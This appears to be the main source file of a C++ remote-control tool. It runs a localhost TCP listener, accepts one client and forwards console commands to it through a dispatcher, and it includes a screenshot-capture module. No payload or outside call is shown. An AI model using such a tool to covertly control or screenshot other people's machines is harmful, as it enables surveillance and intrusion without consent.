#include <iostream>
#include <memory>
#include <cstdio>

#include "networking/WinsockTCPServer.h"
#include "networking/interfaces/ITCPClient.h"

#include "command/CommandDispatcher.h"
#include "utils/builders.h"

#ifdef _DEBUG
#include "command/execute/ScreenshotExecuter.h"
#endif // _DEBUG

int main(int argc, char *argv[], char *envp[])
{
#ifdef _DEBUG
    networking::WinsockTCPServer connection;

    std::unique_ptr<command::CommandDispatcher> dispatcher(
        utils::builders::BuildDispatcher());

    connection.Bind("127.0.0.1", 12121);
    connection.Listen(1);
    std::unique_ptr<networking::ITCPClient> client(
        connection.Accept());

    std::cerr << "Received connection" << std::endl;

    std::string command;

    while ( 0 != command.compare("exit") )
    {
        std::cout << ">> ";
        getline(std::cin, command);

        dispatcher->Dispatch(command, *client.get());
    }

    return ( 0 );
#else
//    CommandProcessor commandProcessor();
//
//    Server connection;
//    connection.WaitForConnection(9999);
//
//    std::cout << "Received connection" << std::endl;
//
//    std::string command;
//
//    while( true )
//    {
//        getline(std::cin, command);
//
//        commandProcessor.Process(command, connection);
//    }

    return ( 0 );
#endif
}
